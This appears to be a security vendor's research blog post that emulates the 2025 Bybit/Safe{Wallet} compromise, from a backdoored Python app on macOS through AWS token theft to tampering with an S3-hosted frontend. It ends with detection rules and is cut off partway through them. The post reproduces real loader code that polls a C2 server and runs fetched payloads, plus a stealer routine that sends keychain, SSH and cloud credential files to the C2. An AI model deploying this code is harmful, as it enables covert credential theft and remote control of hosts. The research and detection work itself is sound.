[Sygnia](https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/), [Mandiant/SAFE](https://x.com/safe/status/1897663514975649938), [SlowMist](https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34), and [Unit42](https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/).\n\n![](/assets/images/bit-bybit/image12.png)\n\n## Chronology of events\n\nIf you're here for the technical emulation details, feel free to skip ahead. But for context— and to clarify what was officially reported— we've compiled a high-level timeline of events to ground our assumptions based on the research referenced above.\n\n**February 2, 2025** – Infrastructure Setup\n\n\nThe attacker registers the domain getstockprice[.]com via Namecheap. This infrastructure is later used as the C2 endpoint in the initial access payload.\n\n**February 4, 2025** – Initial Compromise\n\n\nDeveloper1’s macOS workstation is compromised after executing a malicious Python application. This application contained Docker-related logic and referenced the attacker’s domain. The file path (`~/Downloads/`) and malware behavior suggest social engineering (likely via Telegram or Discord, consistent with past [REF7001](https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn) and UNC4899 tradecraft).\n\n**February 5, 2025** – AWS Intrusion Begins\n\n\n\nAttacker successfully accesses Safe\\{Wallet\\}’s AWS environment using Developer1’s active AWS session tokens.Attacker attempts (unsuccessfully) to register their own virtual MFA device to Developer1’s IAM user, indicating a persistence attempt.\n\n**February 5–17**: Reconnaissance activity begins within the AWS environment. During this time, attacker actions likely included the enumeration of IAM roles, S3 buckets, and other cloud assets.\n\n**February 17, 2025** – AWS Command and Control Activity\n\n\nConfirmed C2 traffic observed in AWS. This marks the shift from passive reconnaissance to active staging of the attack.\n\n**February 19, 2025** – Web Application Tampering\n\n\nA snapshot of app.safe.global (Safe\\{Wallet\\}’s statically hosted Next.js web app) captured by the Wayback Machine shows the presence of malicious JavaScript. The payload was crafted to detect a Bybit multisig transaction and modify it on-the-fly, redirecting funds to the attacker’s wallet.\n\n**February 21, 2025** – Execution and Cleanup\n\n\nThe exploit transaction is executed against Bybit via the compromised Safe\\{Wallet\\} frontend.\n\nA new Wayback Machine snapshot confirms the JavaScript payload has been removed—indicating the attacker manually scrubbed it post-execution.\n\nThe Bybit heist transaction is finalized. Approximately 400,000 ETH is stolen. Subsequent analysis by Sygnia and others confirms that Bybit infrastructure was not directly compromised—Safe\\{Wallet\\} was the sole point of failure.\n\n## Assumptions for emulation \n\n* Initial Social Engineering Vector:\nSocial engineering was employed to compromise Developer1, resulting in the execution of a malicious Python script. The exact details of the social engineering tactic (such as specific messaging, impersonation techniques, or the communication platform used) remain unknown.\n* Loader and Second-Stage Payload:\nThe malicious Python script executed a second-stage loader. It is currently unclear whether this loader and subsequent payloads match those detailed in Unit42's reporting, despite alignment in the initial access Python application's characteristics.\n* Safe Application Structure and Workflow:\nThe compromised application (`app.global.safe`) appears to be a Next.js application hosted statically in AWS S3. However, specific details such as its exact routes, components, development processes, version control methods, and production deployment workflow are unknown.\n* JavaScript Payload Deployment:\nWhile attackers injected malicious JavaScript into the Safe\\{Wallet\\} application, it is unclear whether this involved rebuilding and redeploying the entire application or merely overwriting/modifying a specific JavaScript file.\n* AWS IAM and Identity Management Details:\nDetails regarding Developer1’s IAM permissions, roles, and policy configurations within AWS are unknown. Additionally, whether Safe\\{Wallet\\} used AWS IAM Identity Center or alternative identity management solutions remains unclear.\n* AWS Session Token Retrieval and Usage:\nWhile reports confirm the attackers used temporary AWS session tokens, details about how Developer1 originally retrieved these tokens (such as through AWS SSO, `GetSessionToken`, or specific MFA configurations) and how they were subsequently stored or utilized (e.g., environment variables, AWS config files, custom scripts) are unknown.\n* AWS Enumeration and Exploitation Techniques:\nThe exact tools, enumeration methodologies, AWS API calls, and specific actions carried out by attackers within the AWS environment between February 5 and February 17, 2025, remain undisclosed.\n* AWS Persistence Mechanisms:\nAlthough there is an indication of potential persistence within AWS infrastructure (e.g., via EC2 instance compromise), explicit details including tools, tactics, or persistence methods are not provided.\n\n## Overview of the attack\n\nTargeting companies within the crypto ecosystem is a common occurrence. DPRK continually targets these companies due to the relative anonymity and decentralized nature of cryptocurrency, enabling the regime to evade global financial sanctions. North Korea's offensive cyber groups excel at identifying and exploiting vulnerabilities, resulting in billions of dollars in losses.\n\nThis intrusion began with the [targeted compromise](https://x.com/safe/status/1897663514975649938?s=09) of a developer's MacOS workstation at Safe\\{Wallet\\}, ByBit’s trusted multi-signature wallet provider. Initial access involved social engineering, likely approaching the developer via platforms like LinkedIn, Telegram, or Discord, based on previous campaigns, and convincing them to download an archive file containing a crypto-themed Python application—an initial access procedure favored by DPRK. This Python application also included a Dockerized version of the application that could be run inside a privileged container. Unknown to the developer, this seemingly benign application enabled DPRK operators to exploit a remote code execution (RCE) [vulnerability](https://www.cvedetails.com/cve/CVE-2017-18342/) in the PyYAML library, providing code execution capabilities and subsequently control over the host system.\n\nAfter gaining initial access to the developer's machine, attackers deployed [MythicC2](https://github.com/its-a-feature/Mythic)'s [Poseidon agent](https://github.com/MythicAgents/poseidon), a robust Golang-based payload offering advanced stealth and extensive post-exploitation capabilities for macOS environments. The attackers then may have conducted reconnaissance, discovering the developer's access to Safe\\{Wallet\\}’s AWS environment and the usage of temporary AWS user session tokens secured via multi-factor authentication (MFA). Armed with the developer's AWS access key ID, secret key, and temporary session token, the threat actors then authenticated into Safe\\{Wallet\\}’s AWS environment within approximately 24 hours, capitalizing on the 12-hour validity of the session tokens.\n\nAttempting to ensure persistent access to the AWS environment, the attackers tried to register their own MFA device. However, AWS temporary session tokens do not permit IAM API calls without [MFA authentication context](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html#:~:text=You%20cannot%20call%20any%20IAM,in%20the%20IAM%20User%20Guide), causing this attempt to fail. Following this minor setback, the threat actor enumerated the AWS environment, eventually discovering an S3 bucket hosting Safe\\{Wallet\\}'s static Next.js user interface.\n\nThe attackers could then have downloaded this Next.js application’s bundled code, spending nearly two weeks analyzing its functionality before injecting malicious JavaScript into the primary JS file and overwriting the legitimate version hosted in the S3 bucket. The malicious JavaScript code was activated exclusively on transactions initiated from Bybit’s cold wallet address and an attacker-controlled address. By inserting hardcoded parameters, the script circumvented transaction validation checks and digital signature verifications, effectively deceiving ByBit wallet approvers who implicitly trusted the Safe\\{Wallet\\} interface.\n\nShortly thereafter, the DPRK initiated a fraudulent transaction, triggering the malicious script to alter transaction details. This manipulation, likely, contributed to misleading the wallet signers into approving the illicit transfer, thereby granting DPRK operatives control of approximately 400,000 ETH. These stolen funds were then laundered into attacker-controlled wallets. \n\nWe chose to end our research and behavior emulation at the compromise of the Next.js application. Thus, we do not dive into the blockchain technologies, such as ETH smart contracts, contract addresses, and sweep ETH calls discussed in several other research publications.\n\n## Emulating the attack\n\nTo truly understand this breach we decided to emulate the entire attack chain in a controlled lab environment. As security researchers at Elastic, we wanted to walk in the footsteps of the attacker to understand how this operation unfolded at each stage: from code execution to AWS session hijacking and browser-based transaction manipulation.\n\nThis hands-on emulation served a dual purpose. First, it allowed us to analyze the attack at a granular, technical level to uncover practical detection and prevention opportunities. Second, it gave us the chance to test Elastic’s capabilities end-to-end—to see whether our platform could not only detect each phase of the attack, but also correlate them into a cohesive narrative that defenders could act on.\n\n### MacOS endpoint compromise\n\nThanks to [Unit42](https://unit42.paloaltonetworks.com/)’s detailed write-up—and more critically, uploading recovered samples to VirusTotal—we were able to emulate the attack end-to-end using the actual payloads observed in the wild. This included:\n\n* PyYAML deserialization payload\n* Python loader script\n* Python stealer script\n\n#### Malicious Python Application \n\nThe initial access Python application we used in our emulation aligns with samples highlighted and shared by [SlowMist](https://www.slowmist.com/) and corroborated by Mandiant's [incident response findings](https://x.com/safe/status/1897663514975649938) from the SAFE developer compromise. This application also matched the directory structure of the application shown by Unit42 in their write-up. Attackers forked a legitimate stock-trading Python project from GitHub and backdoored it within a Python script named `data_fetcher.py`.\n\n![Python Application Directory Structure](/assets/images/bit-bybit/image13.png)\n\nThe application leverages [Streamlit](https://streamlit.io/) to execute `app.py`, which imports the script `data_fetcher.py`.\n\n![Python Application README.txt usage](/assets/images/bit-bybit/image5.png)\n\nThe `data_fetcher.py` script includes malicious functionality designed to reach out to an attacker-controlled domain.\n\n![data_fetcher.py class with yaml.load functionality](/assets/images/bit-bybit/image8.png)\n\nThe script, by default, fetches valid stock market-related data. However, based on specific conditions, the attacker-controlled server can return a malicious YAML payload instead. When evaluated using PyYAML’s unsafe loader (`yaml.load()`), this payload allows for arbitrary Python object deserialization, resulting in RCE.\n\n#### PyYAML Deserialization Payload \n\n(VT Hash: `47e997b85ed3f51d2b1d37a6a61ae72185d9ceaf519e2fdb53bf7e761b7bc08f`)\n\nWe recreated this malicious setup by hosting the YAML deserialization payload on a Python+Flask web application, using PythonAnywhere to mimic attacker infrastructure. We updated the malicious URL in the `data_fetcher.py` script to point to our PythonAnywhere-hosted YAML payload.\n\nWhen PyYAML loads and executes the malicious YAML payload, it performs the following actions:\n\nFirst, it creates a directory named `Public` in the victim’s home directory.\n\n```py\ndirectory = os.path.expanduser(\"~\")\ndirectory = os.path.join(directory, \"Public\")\n\nif not os.path.exists(directory):\n    os.makedirs(directory)\n```\n\nNext, it decodes and writes a base64-encoded Python loader script into a new file named `__init__.py` within the `Public` directory.\n\n```py\nfilePath = os.path.join(directory, \"__init__.py\")\n\nwith open(filePath, \"wb\") as f:\n    f.write(base64.b64decode(b\"BASE64_ENCODED_LOADER_SCRIPT\"))\n```\n\nFinally, it executes the newly created `__init__.py` script silently in the background, initiating the second stage of the attack.\n\n```py\nsubprocess.Popen([sys.executable, filePath], start_new_session=True, stdout=DEVNULL, stderr=DEVNULL)\n```\n\n#### Python Loader Script \n\n(VT Hash: `937c533bddb8bbcd908b62f2bf48e5bc11160505df20fea91d9600d999eafa79`)\n\nTo avoid leaving forensic evidence, the loader first deletes its file (`__init__.py`) after execution, leaving it running in memory only.\n\n```py\ndirectory = os.path.join(home_directory, \"Public\")\n\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n    try:\n        body_path = os.path.join(directory, \"__init__.py\")\n        os.remove(body_path)\n```\n\nThis loader’s primary goal is to establish continuous communication with the Command-and-Control (C2) server. It gathers basic system information—like OS type, architecture, and system version—and sends these details to the C2 via an HTTP POST request to the hardcoded /club/fb/status URL endpoint. \n\n```py\nparams = {\n        \"system\": platform.system(),\n        \"machine\": platform.machine(),\n        \"version\": platform.version()\n    }\n    while True:\n        try:\n            response = requests.post(url, verify=False, data = params, timeout=180)\n```\n\nBased on the server’s response (ret value), the loader decides its next steps.\n\n##### ret == 0:\n\nThe script sleeps for 20 seconds and continues polling. \n\n```py\nif res['ret'] == 0:\n    time.sleep(20)\n    continue\n```\n\n##### ret == 1:\n\nThe server response includes a payload in Base64. The script decodes this payload, and writes it to a file—named `init.dll` if on Windows or `init` otherwise—and then dynamically loads the library using `ctypes.cdll.LoadLibrary`, which causes the payload to run as a native binary.\n\n```py\nelif res['ret'] == 1:\n    if platform.system() == \"Windows\":\n        body_path = os.path.join(directory, \"init.dll\")\n    else:\n        body_path = os.path.join(directory, \"init\")\n        with open(body_path, \"wb\") as f:\n            binData = base64.b64decode(res[\"content\"])\n            f.write(binData)\n            os.environ[\"X_DATABASE_NAME\"] = \"\"\n            ctypes.cdll.LoadLibrary(body_path)\n```\n\n##### ret == 2:\n\nThe script decodes the Base64 content into Python source code and then executes it using Python’s `exec()` function. This allows for running arbitrary Python code.\n\n```py\nelif res['ret'] == 2:\n    srcData = base64.b64decode(res[\"content\"])\n    exec(srcData)\n```\n\n##### ret == 3:\n\nThe script decodes a binary payload (`dockerd`) and a binary configuration file (`docker-init`) into two separate files, sets their permissions to be executable, and then attempts to run them as a new process, supplying the config file as an argument to the binary payload. After execution of the binary payload, it deletes its executable file, leaving the config file on disk for reference.\n\n```py\nelif res['ret'] == 3:\n    path1 = os.path.join(directory, \"dockerd\")\n    with open(path1, \"wb\") as f:\n        binData = base64.b64decode(res[\"content\"])\n        f.write(binData)\n\n    path2 = os.path.join(directory, \"docker-init\")\n    with open(path2, \"wb\") as f:\n        binData = base64.b64decode(res[\"param\"])\n        f.write(binData)\n\n    os.chmod(path1, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |\n                    stat.S_IRGRP | stat.S_IXGRP |\n                    stat.S_IROTH | stat.S_IXOTH)\n\n    os.chmod(path2, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |\n                    stat.S_IRGRP | stat.S_IXGRP |\n                    stat.S_IROTH | stat.S_IXOTH)\n\n    try:\n        process = subprocess.Popen([path1, path2], start_new_session=True)\n        process.communicate()\n        return_code = process.returncode\n        requests.post(SERVER_URL + '/club/fb/result', verify=False, data={\"result\": str(return_code)})\n    except:\n        pass\n\n    os.remove(path1)\n```\n\n##### ret == 9:\n\nThe script breaks out of its polling loop, terminating further actions.\n\n```py\nelif res['ret'] == 9:\n    break\n```\n\nAfter processing any command, the script continues to poll for further instructions from the C2 server.\n\n#### Python Loader Emulation\n\nOur goal was to test each of the command options within the loader to better understand what was happening, collect relevant telemetry data, and analyze it for the purpose of building robust detections for both our endpoint and the SIEM.\n\n**Ret == 1: Write Library to Disk, Load and Delete Dylib**\n\nThe payload we used for this option was a [Poseidon](https://github.com/MythicAgents/poseidon) payload compiled as a shared library (`.dylib`). \n\n![Mythic C2 Payload Builder](/assets/images/bit-bybit/image9.png)\n\nWe then base64-encoded the binary and were able to hardcode the path to that base64-encoded payload in our C2 server to be served when testing this specific loader command.\n\n```shell\nbase64 poseidon.dylib \u003e poseidon.b64\n```\n\n```py\nBINARY_PAYLOAD_B64 = \"BASE64_ENCODED_DYLIB_PAYLOAD\"  # For ret==1\nSTEALER_PAYLOAD_B64 = \"BASE64_ENCODED_STEALER_SCRIPT\" # For ret==2\nMULTI_STAGE_PAYLOAD_B64 = \"BASE64_ENCODED_MULTISTAGE_PAYLOAD\" # For ret==3\n# For testing we simulate a command to send.\n# Options: 0, 1, 2, 3, 9.\n# 0: Idle (sleep); 1: Execute native binary; 2: Execute Python code; 3: Execute multi-stage payload; 9: Terminate.\nCOMMAND_TO_SEND = 1   # Change this value to test different actions\n```\n\nOnce we received our Poseidon payload callback to our [Mythic C2](https://github.com/its-a-feature/Mythic) we were able to retrieve credentials using a variety of different methods provided by Poseidon. \n\nOption 1: [download command](https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/download.md) \\- Access file, reads content, sends data back to C2.  \nOption 2: [getenv command](https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/getenv.md) \\- Read user environment variables and send content back to C2.  \nOption 3: [jsimport](https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport.go) \u0026 [jsimport\\_call](https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport_call.go) commands \\- Import JXA script into memory then call a method within the JXA script to retrieve credentials from file and return contents.\n\n#####  Ret == 2: Receive and Execute arbitrary Python code within Process Memory \n\n(VT Hash: `e89bf606fbed8f68127934758726bbb5e68e751427f3bcad3ddf883cb2b50fc7`)\n\nThe loader script allows for the running of arbitrary Python code or scripts, in memory. In Unit42’s blog they provided a Python script they observed the DPRK executing via this return value. This script collects a vast amount of data. This data is XOR encoded and sent back to the C2 server via a POST request. For the emulation all that was needed was to add our C2 URL with the appropriate route as defined in our C2 server and base64 encode the script hardcoding its path within our server for when this option was tested.\n\n```py\ndef get_info():\n    global id\n    id = base64.b64encode(os.urandom(16)).decode('utf-8')\n    \n    # get xor key\n    while True:\n        if not get_key():\n            break\n\n        base_info()\n        send_directory('home/all', '', home_dir)\n        send_file('keychain', os.path.join(home_dir, 'Library', 'Keychains', 'login.keychain-db'))\n        send_directory('home/ssh', 'ssh', os.path.join(home_dir, '.ssh'), True)\n        send_directory('home/aws', 'aws', os.path.join(home_dir, '.aws'), True)\n        send_directory('home/kube', 'kube', os.path.join(home_dir, '.kube'), True)\n        send_directory('home/gcloud', 'gcloud', os.path.join(home_dir, '.config', 'gcloud'), True)\n        finalize()\n        break\n```\n\n##### Ret == 3: Write Binary Payload and Binary Config to Disk, Execute Payload and Delete File\n\nFor ret == 3 we used a standard Poseidon binary payload and a “configuration file” containing binary data as specified in the loader script. We then base64 encoded both the binary and config file like the ret == 1 option above and hardcoded their paths in our C2 server for serving when testing this command. Same as the ret == 1 option above we were able to use those same commands to collect credentials from the target system.\n\n#### C2 Infrastructure\n\nWe created a very simple and small C2 server, built with Python+Flask, intended to listen with a specified port on our Kali Linux VM and evaluate incoming requests, responding appropriately based on the route and return value we wished to test. \n\n![Custom Python+Flask C2 Server](/assets/images/bit-bybit/image15.png)\n\nWe also used the open source [Mythic C2](https://github.com/its-a-feature/Mythic) in order to facilitate the creation and management of the Poseidon payloads we used. Mythic is an open source C2 framework created and maintained by [Cody Thomas](https://github.com/its-a-feature) at [SpecterOps](https://specterops.io/). \n\n![Mythic C2 Active Callbacks Interactive Agent Window](/assets/images/bit-bybit/image14.png)\n\n#### Malicious Python Application: Docker Version\n\nWe also explored a Dockerized variant of the malicious Python application. This version was packaged in a minimal Python Docker container (python:3.12.2-slim) running in privileged mode, granting it the ability to access host resources.\n\nA containerized application creates a telemetry and detection blind spot on macOS because Apple's Endpoint Security Framework (ESF) lacks the ability to introspect containerized processes. While ESF and endpoint detection solutions can still observe the trusted Docker process accessing sensitive host files—such as SSH keys, AWS credentials, or user configuration data—these actions commonly align with standard developer workflows. As a result, security tools are less likely to scrutinize or trigger alerts on containerized activities, offering attackers increased stealth when operating from within Docker environments.\n\nThis highlights the necessity for additional monitoring like [OSQuery](https://www.osquery.io/) and [Docker](https://www.docker.com/) log file collection to complement standard macOS endpoint defenses. Elastic offers both [OSQuery](https://www.elastic.co/docs/reference/integrations/osquery_manager) and [Docker](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container) log file collection via our [data integrations](https://www.elastic.co/integrations/data-integrations) for Elastic Agent alongside our Endpoint protection features.\n\n#### MacOS Emulation Conclusion\n\nOur emulation recreated the attack against the SAFE developers’ macOS system end-to-end using the real world payloads.\n\n**Malicious Python App:**\n\nWe began by replicating the malicious Python application described in both Mandiant’s findings and Unit42’s report. The attackers had forked a legitimate open-source application and embedded RCE access within `data_fetcher.py`. This script made outbound requests to an attacker-controlled server and conditionally fetched a malicious YAML file. Using PyYAML’s `yaml.load()` with an unsafe loader, the attacker triggered arbitrary code execution via deserialization.\n\n**PyYAML Payload Deserialization resulting in Python Loader Script Execution:**\n\nThe YAML payload wrote a base64-encoded second-stage loader to `~/Public/__init__.py` and executed it in a detached process. We mimicked this exact flow using a Flask-based staging server hosted on PythonAnywhere.\n\n**Python Loader Execution \u0026 C2 Interaction:**\n\nOnce launched, the loader deleted its on disk file and beaconed to our emulated C2, awaited tasking. Based on the C2’s response code (`ret`), we tested the following actions:\n\n* **ret == 1**: The loader decoded a Poseidon payload (compiled as a `.dylib`) and executed it using `ctypes.cdll.LoadLibrary()`, resulting in native code execution from disk.\n* **ret == 2**: The loader executed an in-memory Python stealer, matching the script shared by Unit42. This script collected system, user, browser, and credential data and exfiltrated it via XOR-encoded POST requests.\n* **ret == 3**: The loader wrote a Poseidon binary and a separate binary configuration file to disk, executed the binary with the config as an argument, then deleted the payload.\n* **ret == 9**: The loader terminated its polling loop.\n\n**Data Collection: Pre-Pivot Recon \u0026 Credential Access:**\n\nDuring our **ret == 2** test, the Python stealer gathered:\n\n* macOS system information (`platform`, `os`, `user`)\n* Chrome user data (Bookmarks, Cookies, Login Data, etc.)\n* SSH private keys (`~/.ssh`)\n* AWS credentials (`~/.aws/credentials`)\n* macOS Keychain files (`login.keychain-db`)\n* GCP/Kube config files from `.config/`\n\nThis emulates the pre-pivot data collection that preceded cloud exploitation, and reflects how DPRK actors harvested AWS credentials from the developer’s local environment.\n\nWith valid AWS credentials, the threat actors then pivoted into the cloud environment, launching the second phase of this intrusion.\n\n![AWS cloud compromise execution flow](/assets/images/bit-bybit/image22.png)\n\n### AWS cloud compromise\n\n#### Pre-requisities and Setup\n\nTo emulate the AWS stage of this attack, we first leveraged Terraform to stand up the necessary infrastructure. This included creating an IAM user (developer) with an overly permissive IAM policy granting access to S3, IAM, and STS APIs. We then pushed a locally built Next.js application to an S3 bucket and confirmed the site was live, simulating a simple Safe\\{Wallet\\} frontend. \n\nOur choice of `Next.js` was predicated on the original S3 bucket static site path - `https://app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47.js`\n\nBefore injecting any malicious code, we verified the integrity of the site by performing a test transaction using a known target wallet address to ensure the application responded as expected.\n\n![Transaction by custom frontend static site](/assets/images/bit-bybit/image1.png)\n\n#### Temporary Session Token Retrieval\n\nFollowing the initial access and post-compromise activity on the developer’s macOS workstation, early assumptions focused on the adversary retrieving credentials from default AWS configuration locations - such as `~/.aws` or from user environment variables. It was later confirmed by Unit42’s blog that the Python stealer script targeted AWS files. These locations often store long-term IAM credentials or temporary session tokens used in standard development workflows. Based on public reporting, however, this specific compromise involved AWS user session tokens, not long-term IAM credentials. In our emulation, as the developer we added our virtual MFA device to our IAM user, enabled it and then retrieved our user session token and exported the credentials to our environment. Note that on our Kali Linux endpoint, we leveraged ExpressVPN - as done by the adversaries - for any AWS API calls or interactions with the developer box.\n\nIt is suspected that the developer obtained temporary AWS credentials either by the [GetSessionToken](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html) API operation or by logging in via AWS Single Sign-On (SSO) using the AWS CLI. Both methods result in short-lived credentials being cached locally and usable for CLI or SDK-based interactions. These temporary credentials were then likely cached in the `~/.aws` files or exported as environment variables on the macOS system.\n\nIn the *GetSessionToken* scenario, the developer would have executed a command as such:\n\n```shell\naws sts get-session-token --serial-number \"$ARN\" --token-code \"$FINAL_CODE\"  --duration-seconds 43200 --profile \"$AWS_PROFILE\" --output json\n```\n\nIn the SSO-based authentication scenario, the developer may have run:\n\n```shell\naws configure sso \naws sso login -profile \"$AWS_PROFILE\" -use-device-code \"OTP\"`\n```\n\nEither method results in temporary credentials (access key, secret and session token) being saved in `~/.aws` files and made available to the configured AWS profile. These credentials are then used automatically by tools like the AWS CLI or SDKs like Boto3 unless overridden. In either case, if malware or an adversary had access to the developer’s macOS system, these credentials could have been easily harvested from the environment variables, AWS config cache or credentials file.\n\nTo obtain these credentials for Developer1 were created a custom script for quick automation. It created a virtual MFA device in AWS, registered the device with our Developer1 user, then called `GetSessionToken` from STS - adding the returned temporary user session credentials to our macOS endpoint as environment variables as shown below.\n\n#### MFA Device Registration Attempts\n\n![Registering our MFA device for the developer and retrieving user session token via shellscript](/assets/images/bit-bybit/image20.png)\n\nOne key assumption here is that the developer was working with a user session that had MFA enabled, either for direct use or to assume a custom-managed IAM role. Our assumption derives from the credential material compromised - AWS temporary user session tokens, which are not obtained from the console but rather requested on demand from STS. Temporary credentials returned from `GetSessionToken` or SSO by default expire after a certain number of hours, and a session token with the ASIA* prefix would suggest that the adversary harvested a short-lived but high-impact credential. This aligns with behaviors seen in previous DPRK-attributed attacks where credentials and configurations for Kubernetes, GCP, and AWS were extracted and reused.\n\n![Environment variables output of our AWS user session token after GetSessionToken call](/assets/images/bit-bybit/image11.png)\n\n#### Assuming the Compromised Identity on Kali\n\nOnce the AWS session token was collected, the adversary likely stored it on their Kali Linux system either in the standard AWS credential locations (e.g., `~/.aws/credentials` or as environment variables) or potentially in a custom file structure, depending on tooling in use. While the AWS CLI defaults to reading from `~/.aws/credentials` and environment variables, a Python script leveraging Boto3 could be configured to source credentials from nearly any file or path. Given the speed and precision of the post-compromise activity, it is plausible that the attacker used either the AWS CLI, direct Boto3 SDK calls, or shell scripts wrapping CLI commands - all of which offer convenience and built-in request signing.\n\nWhat seems less likely is that the attacker manually signed AWS API requests using SigV4, as this would be unnecessarily slow and operationally complex. It’s also important to note that no public blog has disclosed which user agent string was associated with the session token usage (e.g. aws-cli, botocore, etc.), which leaves uncertainty around the attacker’s exact tools. That said, given DRPK’s established reliance on Python and the speed of the attack, CLI or SDK usage remains the most reasonable assumption.\n\n![MythicC2 getenv command output](/assets/images/bit-bybit/image16.png)\n\n**Note:** We did this in emulation with our Poseidon payload prior to Unit 42’s blog about the RN Loader capabilities.\n\nIt’s important to clarify a nuance about the AWS authentication model: using a session token does not [inherently block access to IAM API actions](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_getsessiontoken.html) - even actions like [CreateVirtualMFADevice](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateVirtualMFADevice.html) - as long as the session was initially established with MFA. In our emulation, we attempted to replicate this behavior using a stolen session token that had MFA context. Interestingly, our attempts to register an additional MFA device failed, suggesting that there may be additional safeguards, such as explicit policy constraints, that prevent MFA registration via session tokens or the details of this behavior are still too vague and we incorrectly mimicked the behavior. While the exact failure reason remains unclear, this behavior warrants deeper investigation into the IAM policies and authentication context associated with session-bound actions.\n\n#### S3 Asset Enumeration\n\nAfter credential acquisition, the attacker likely enumerated accessible AWS services. In this case, Amazon S3 was a clear target. The attacker would have listed buckets available to the compromised identity across all regions and located a public-facing bucket associated with Safe\\{Wallet\\}, which hosted the frontend Next.js application for transaction processing. \n\nWe assume the attacker was aware of the S3 bucket due to its role in serving content for `app.safe[.]global`, meaning the bucket's structure and assets could be publicly browsed or downloaded without authentication. In our emulation, we validated similar behavior by syncing assets from a public S3 bucket used for static site hosting.\n\n![Bucket containing statically hosted frontend static site assets](/assets/images/bit-bybit/image6.png)\n\n![Statically hosted frontend static site assets in target bucket](/assets/images/bit-bybit/image21.png)\n\n#### Next.js App Overwrite with Malicious Code\n\nAfter discovering the bucket, the attacker likely used the aws s3 [sync](https://docs.aws.amazon.com/cli/latest/reference/s3/sync.html) command to download the entire contents, which included the bundled frontend JavaScript assets. Between February 5 and February 19, 2025, they appeared to focus on modifying these assets - specifically, files like `main.\u003cHASH\u003e.js` and related routes, which are output by `Next.js` during its build process and stored under the `_next/static/chunks/pages/` directory. These bundled files contain the transpiled application logic, and according to Sygnia's forensic report, a file named `_app-52c9031bfa03da47.js` was the primary injection point for the malicious code.\n\n![Leveraging AWS CLI sync command to download bucket contents](/assets/images/bit-bybit/image23.png)\n\nNext.js applications, when built, typically store their statically generated assets under the `next/static/` directory, with JavaScript chunks organized into folders like `/chunks/pages/`. In this case, the adversary likely formatted and deobfuscated the JavaScript bundle to understand its structure, then reverse engineered the application logic. After identifying the code responsible for handling user-entered wallet addresses, they injected their [payload](`https[:]//web[.]archive[.]org/web/20250219172905/https[:]//app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47[.]js`). This payload introduced conditional logic: if the entered wallet address matched one of several known target addresses, it would silently replace the destination with a DPRK-controlled address, redirecting funds without the user becoming aware.\n\n![](/assets/images/bit-bybit/image4.png)\n\n![Modifying the non-formatted bundled static site code of our own app](/assets/images/bit-bybit/image7.png)\n\nIn our emulation, we replicated this behavior by modifying the `TransactionForm.js` component to check if the entered recipient address matched specific values. If so, the address was replaced with an attacker-controlled wallet. While this does not reflect the complexity of actual smart contract manipulation or delegate calls used in the real-world attack, it serves as conceptual behavior to illustrate how a compromised frontend could silently redirect cryptocurrency transactions.\n\n![Our static site frontend script pop-up notifying the target wallet address condition was met after malicious code upload](/assets/images/bit-bybit/image2.png)\n\n#### Static Site Tampering Implications and Missing Security Controls\n\nThis type of frontend tampering is especially dangerous in Web3 environments, where decentralized applications (dApps) often rely on static, client-side logic to process transactions. By modifying the JavaScript bundle served from the S3 bucket, the attacker was able to subvert the application’s behavior without needing to breach backend APIs or smart contract logic.\n\nWe assume that protections such as [S3 Object Lock](https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html), Content-Security-Policy (CSP), or Subresource Integrity (SRI) headers were either not in use or not enforced during the time of compromise. The absence of these controls would have allowed an attacker to modify static frontend code without triggering browser or backend integrity validation, making such tampering significantly easier to carry out undetected.\n\n## Lessons in defense\n\nA successful emulation—or real-world incident response—doesn’t end with identifying attacker behaviors. It continues with reinforcing defenses to prevent similar techniques from succeeding again. Below, we outline key detections, security controls, mitigation strategies, and Elastic features that can help reduce risk and limit exposure to the tactics used in this emulation and in-the-wild (ItW) campaigns like the Safe\\{Wallet\\} compromise.\n\n**Note:** These detections are actively maintained and regularly tuned, and may evolve over time. Depending on your environment, additional tuning may be required to minimize false positives and reduce noise.\n\n## Elastic’s SIEM detection and endpoint prevention rules\n\nOnce we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.\n\nOnce we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.\n\n#### [MacOS Endpoint Behavior Prevention Rules](https://github.com/elastic/protections-artifacts/tree/main/behavior/rules/macos)\n\n##### Python PyYAML Deserialization Payload\n\n**Rule Name: “[Python Script Drop and Execute](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_python_script_drop_and_execute.md)”:** Detects when a Python script gets created or modified followed immediately by the execution of that script by the same Python process.\n\n##### Python Loader Script\n\n**Rule Name: “[Self-Deleting Python Script](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleting_python_script.md)”:** Detects when a Python script executes and that script file is immediately deleted by the same Python process.\n\n**Rule Name: “[Self-Deleted Python Script Outbound Connection](https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/defense_evasion_self_deleted_python_script_outbound_network_connection.md)”:** Detects when a Python script gets deleted and an outbound network connection occurs shortly after by the same Python process. \n\n##### Python Loader Script Ret == 1\n\n**Rule Name: 